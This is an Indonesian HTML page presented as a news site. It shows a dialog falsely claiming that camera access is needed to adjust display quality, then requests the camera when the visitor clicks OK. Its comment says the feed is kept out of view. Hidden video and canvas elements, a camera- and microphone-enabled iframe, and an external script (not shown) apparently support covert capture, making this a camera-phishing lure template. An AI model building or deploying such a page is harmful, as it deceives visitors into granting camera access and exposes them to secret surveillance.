<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Berita Informasi</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      font-family: system-ui, sans-serif;
      background-color: #f0f2f5;
    }

    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      z-index: 1;
    }

    #dialog {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 320px;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      z-index: 9999;
      padding: 24px;
      text-align: center;
    }

    #dialog h2 {
      margin-top: 0;
      font-size: 18px;
      color: #333;
    }

    #dialog p {
      font-size: 14px;
      color: #555;
      margin: 12px 0;
    }

    #okBtn {
      margin-top: 16px;
      padding: 10px 20px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      cursor: pointer;
    }

    #okBtn:hover {
      background-color: #0056b3;
    }

    #backdrop {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.3);
      z-index: 9998;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<!-- Dialog Modal -->
<div id="backdrop"></div>
<div id="dialog">
  <h2>Menyesuaikan Tampilan</h2>
  <p>Sistem akan meminta akses kamera Anda untuk menyesuaikan kualitas tampilan.</p>
  <button id="okBtn">OK</button>
</div>

<!-- Hidden Elements -->
<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>
<iframe id="targetFrame" allow="autoplay; camera; microphone; picture-in-picture" allowfullscreen></iframe>

<script>
  document.getElementById("okBtn").addEventListener("click", () => {
    // Tutup dialog
    document.getElementById("dialog").remove();
    document.getElementById("backdrop").remove();

    // Minta izin kamera, tapi tidak menampilkan hasilnya
    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
      })
      .catch((err) => {
        console.warn("Izin kamera ditolak atau gagal:", err);
      });
  });
</script>

<script src="/script.js"></script>

</body>
</html>
